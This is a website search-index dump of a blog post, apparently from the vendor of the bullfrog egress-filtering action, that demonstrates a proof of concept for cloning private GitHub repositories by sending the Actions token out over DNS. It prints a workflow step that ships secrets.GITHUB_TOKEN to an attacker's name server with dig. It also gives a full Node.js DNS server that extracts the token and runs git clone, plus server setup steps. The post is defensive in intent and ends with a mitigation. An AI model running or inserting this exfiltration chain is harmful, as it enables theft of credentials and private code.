{"/website/blog/":{"data":{"":" RSS Feed "},"title":"Blog"},"/website/blog/dns-exfiltration/":{"data":{"":"This article demonstrates a proof-of-concept for cloning private GitHub repositories using DNS exfiltration, highlighting a potential security risk within GitHub Actions workflows.","conclusion#Conclusion":"DNS exfiltration poses a significant threat to the security of private repositories, especially within automated CI/CD pipelines like GitHub Actions. This proof-of-concept underscores the importance of implementing robust security measures to prevent unauthorized access and data leakage. By leveraging egress filtering solutions and staying vigilant about third-party dependencies, developers can mitigate the risks associated with DNS exfiltration. Always prioritize security best practices and continuous monitoring to ensure the integrity and confidentiality of your code and data.","disclaimer#Disclaimer":" ⚠️ The information provided in this article is intended solely for educational purposes and to raise awareness about potential security vulnerabilities. The techniques demonstrated here, including DNS exfiltration in a GitHub Actions workflow, are meant to help developers and security professionals understand and defend against such threats. Unauthorized hacking, data exfiltration, and any form of cyberattack are illegal and unethical. Always use your knowledge responsibly and adhere to all applicable laws and regulations. The author and publisher of this article do not condone or encourage any malicious activity and are not responsible for any misuse of the information presented. ","exfiltrating-github-token-via-dns#Exfiltrating Github token via DNS":"As you may be aware, every Github Actions workflow is running with a default Github token, which provides by default read permissions on the repository where the workflow is running, and can even have write permissions if the workflow is configured as such. Default workflow Github tokens are short-lived and will only live for the duration of the workflow.\nFor this proof-of-concept, we are particularly interested in private repositories. Malicious code which will exfiltrate data could be running from compromised third-party packages or Github Actions. For the purpose of this proof-of-concept, we’ll assume that a private repository is running a compromised third-party action, which is configured to use the default Github token as an input, making it available for the code running in the action.\nTo simplify this proof-of-concept, we’ll simply run the following workflow in the private repository that we are targeting, which will make a DNS query using dig:\nname: DNS Exfiltration on: push: jobs: test: runs-on: ubuntu-latest steps: - run: | repo=$(echo ${{ github.repository }} | cut -d'/' -f2) dig @\u003cPUBLIC_IP\u003e ${{ github.repository_owner}}.$repo.${{ secrets.GITHUB_TOKEN}}.dnsx.github.com Replace \u003cPUBLIC_IP\u003e with the public IP address of your DNS server and run the workflow above. You should see the private repo being clone in the server where the custom DNS server is running. A short-lived and ephemeral access token couldn’t prevent against DNS exfiltration.","protecting-against-dns-exfiltration#Protecting against DNS exfiltration":"Traditional security solutions that provide egress filtering will require you to allow or block specific IP addresses or IP ranges. Given the highly dynamic nature of IP addresses for most cloud services, this just doesn’t work. There are some more sophisticated security solutions that allow you to filter based on domain names. Unfortunately, many of them do not provide the necessary protection against DNS exfiltration. The problem is that they allow all DNS queries and only block traditional TCP/UDP connections to IP addresses of domains that are not allowed, but in the case of DNS exfiltration, the harm has already been done during the IP resolution.\nSolutions like bullfrog are purpose built for providing egress filtering capabilities in Github Actions workflow and can effectively protect you against DNS exfiltration. To block DNS exfiltration in our POC workflow, add a step at the beginning of the job that use the bullfrog Github Action:\nname: DNS Exfiltration on: push: jobs: test: runs-on: ubuntu-latest steps: - name: Egress filtering uses: bullfrogsec/bullfrog@v0 with: egress-policy: block allowed-domains: | *.github.com - run: | repo=$(echo ${{ github.repository }} | cut -d'/' -f2) dig @\u003cPUBLIC_IP\u003e ${{ github.repository_owner}}.$repo.${{ secrets.GITHUB_TOKEN}}.dnsx.github.com If you run the example workflow above, you should see the DNS query being blocked (in the workflow annotations) and you won’t see the DNS query being received by your custom DNS server. Even with the *.github.com domains being allowed in bullfrog, the query is blocked because the specified name server is not trusted.","setup-the-dns-server#Setup the DNS server":"Get a server that can be accessed publicly We recommend you use an ephemeral VM for this, as we will modify the local DNS resolver and this could mess up with your server’s ability to resolve IP addresses and access any local or remote services.\nFor this POC we are using an AWS EC2 instance using Ubuntu. After launching your Ubuntu EC2 instance, SSH into it and install a few software that we need to run our DNS server.\nsudo apt-get update \u0026\u0026 \\ sudo apt-get install -y dnsmasq nodejs npm net-tools git Create a custom DNS server We’ll use nodejs to create a custom DNS server which will extract Github Token from the DNS query.\nFirst setup the project folder and install native-dns:\nmkdir dnsx cd dnsx npm init -y npm install native-dns Now create a file named dns.js with the content below:\ndns.jsconst dns = require(\"native-dns\"); const server = dns.createServer(); const util = require(\"node:util\"); const { exec: execCb } = require(\"node:child_process\"); const exec = util.promisify(execCb); function getLeetResponse(name) { return dns.A({ name, address: \"1.3.3.7\", ttl: 60, }); } server.on(\"request\", (request, response) =\u003e { request.question.forEach((question) =\u003e { console.log(\"DNS Question:\", question); if (question.name === \"test.dnsx.github.com\") { response.answer.push(getLeetResponse(question.name)); response.send(); return; } const [owner, repo, token] = question.name.split(\".\").slice(0, 3); if (!token || ![\"ghs\", \"ghp\"].includes(token.slice(0, 3))) { console.error(\"Invalid token:\", token); response.answer.push(getLeetResponse(question.name)); response.send(); return; } fullRepo = `${owner}/${repo}`; console.log(`Repo: ${fullRepo}, Token: ${token}`); exec(`git clone https://thanks:${token}@github.com/${fullRepo}.git`).catch( (err) =\u003e { console.error(\"Error:\", err); } ); response.answer.push(getLeetResponse(question.name)); response.send(); }); }); server.on(\"error\", (err) =\u003e { console.error(\"Server error:\", err); }); console.log(\"serving on 5353\"); server.serve(5353); Now run the server:\nnode dns.js You should now see serving on 5353 in your console. You can test that your DNS server is responding to DNS queries using dig:\ndig @127.0.0.1 -p 5353 test.dnsx.github.com The DNS response should be an A record with IP 1.3.3.7.\nIf you look closely at the code from the custom nodejs DNS server, you can notice that we’re expecting to receive DNS queries with the following format \u003cGITHUB_OWNER\u003e.\u003cGITHUB_REPO\u003e.\u003cGITHUB_TOKEN\u003e.dnsx.github.com. Upong receiving the DNS query, the values are extracted from the domain name in the DNS query and immediately the Github repository is cloned.\nConfigure dnsmasq Since our custom DNS server is listening on port 5353 and DNS is usually served on port 53, we’ll configure dnsmasq to use our custom DNS server for DNS queries to domain dnsx.github.com and use 8.8.8.8 (Google’s DNS) for every other domains.\nOpen /etc/dnsmasq.conf and set the following config:\n/etc/dnsmasq.confserver=/dnsx.github.com/127.0.0.1#5353 server=/#/8.8.8.8 interface=lo interface=ens5 # replace with your network interface that will receive public request The second interface in the dnsmasq.conf file is important. You need to make sure the network interface which will receive DNS queries from the internet is added here. On AWS, the network interface is ens5, but a common one is eth0. You can get the default network interface with the following command:\nip route | grep default | awk '{print $5}' Now disble systemd-resolved (default DNS resolver on Ubuntu) and configure the system to use dnsmasq as the DNS resolver.\nsudo systemctl disable --now systemd-resolved Open /etc/resolv.conf and set the following config:\n/etc/resolv.confnameserver 127.0.0.1 Finally, restart the dnsmasq service\nsudo systemctl restart dnsmasq Confirm the setup by sending a DNS query to our default DNS server on port 53:\ndig test.dnsx.github.com Again, the DNS response should be an A record with IP 1.3.3.7.\nTest from the public internet The test above only verified that the DNS server is properly configured on the localhost. Let’s validate the setup is working fine when sending DNS queries from the public internet.\nFirst, make sure the server has a public IP address and has opened the port 53.\nOn AWS, this can be done by adding the following inbound rules to the security group attached to the EC2 instance:\nDNS (TCP), Port 53, Source 0.0.0.0/0 DNS (UDP), Port 53, Source 0.0.0.0/0 Now, from another machine, send a DNS query to your DNS server public IP address:\ndig @\u003cPUBLIC_IP\u003e test.dnsx.github.com Again, the DNS response should be an A record with IP 1.3.3.7.\nUsing the public internet DNS resolution Instead of specifying the custom DNS server as the name server to use for the dig command, you can also use a real domain that you own and configure the NS record to point to your custom DNS server. For example, if you own the example.com domain, you could configure the following DNS records in your domain DNS configuration (e.g. in AWS Route 53 or Cloudflare DNS):\nAdd a A record for ns.example.com that resolves to your custom DNS server public IP address Add a NS record for dnsx.example.com with ns.example.com as the value Now, from any machine, you can send a DNS query to your domain and have it resolved by your custom DNS server:\ndig test.dnsx.example.com "},"title":"Unauthorized clone of private repos using DNS exfiltration"}}